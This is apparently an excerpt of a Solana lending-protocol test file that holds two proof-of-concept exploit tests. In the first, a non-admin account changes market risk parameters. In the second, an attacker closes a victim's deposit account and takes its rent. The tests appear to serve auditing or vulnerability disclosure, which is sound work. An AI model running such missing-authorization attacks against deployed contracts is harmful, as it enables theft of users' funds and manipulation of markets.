...
describe("MetaLend Dual-Asset Tests", () => {
  ...
  it("EXPLOIT: update market params without admin", async () => {
    console.log("Testing exploit: non-admin updates market risk parameters...");

    const marketBefore = await program.account.market.fetch(market);
    expect(marketBefore.marketAdmin.toString()).to.equal(
      admin.publicKey.toString()
    );

    const newCollateralFactor = new anchor.BN(10_000); // 100%
    const newLiquidationThreshold = new anchor.BN(9_900); // 99%

    // user1 is not the market admin but can still update params
    await program.methods
    ...
    expect(marketAfter.marketAdmin.toString()).to.equal(
      admin.publicKey.toString()
    );
    expect(marketAfter.collateralFactor.toNumber()).to.equal(
      newCollateralFactor.toNumber()
    );
    expect(marketAfter.liquidationThreshold.toNumber()).to.equal(
      newLiquidationThreshold.toNumber()
    );

    console.log("Non-admin successfully changed market parameters (vulnerability)");
  });

  it("EXPLOIT: close another user's empty deposit to steal rent", async () => {
    console.log("Testing exploit: attacker closes someone else's user_deposit...");

    // Create a fresh victim user and a corresponding user_deposit with zero balances
    const victim = Keypair.generate();

    // Fund victim for rent and tx fees
    await provider.connection.confirmTransaction(
    ...
    // Victim initializes their own user_deposit
    await program.methods
      .initializeUserDeposit(new anchor.BN(1))
      .accounts({
    ...
    // Sanity check: account exists and belongs to victim
    const victimDepositAccount = await program.account.userDeposit.fetch(
      victimDeposit
    );
    expect(victimDepositAccount.user.toString()).to.equal(
      victim.publicKey.toString()
    );
    expect(victimDepositAccount.supplyDeposited.toNumber()).to.equal(0);
    expect(victimDepositAccount.collateralDeposited.toNumber()).to.equal(0);
    expect(victimDepositAccount.borrowedAmount.toNumber()).to.equal(0);

    const attackerBalanceBefore = await provider.connection.getBalance(
      user1.publicKey
    );
    const victimBalanceBefore = await provider.connection.getBalance(
      victim.publicKey
    );

    // Attacker (user1) closes victim's empty user_deposit and receives the rent lamports
    await program.methods
      .closeUserDeposit()
      .accounts({
        userDeposit: victimDeposit,
    ...
    const victimBalanceAfter = await provider.connection.getBalance(
      victim.publicKey
    );
    const victimAccountInfo =
      await provider.connection.getAccountInfo(victimDeposit);

    expect(attackerBalanceAfter).to.be.greaterThan(attackerBalanceBefore);
    expect(victimBalanceAfter).to.be.equal(victimBalanceBefore);
    expect(victimAccountInfo).to.be.null; // account closed

    console.log(
      "Attacker successfully closed another user's deposit and stole rent (vulnerability)"
    );
  });
});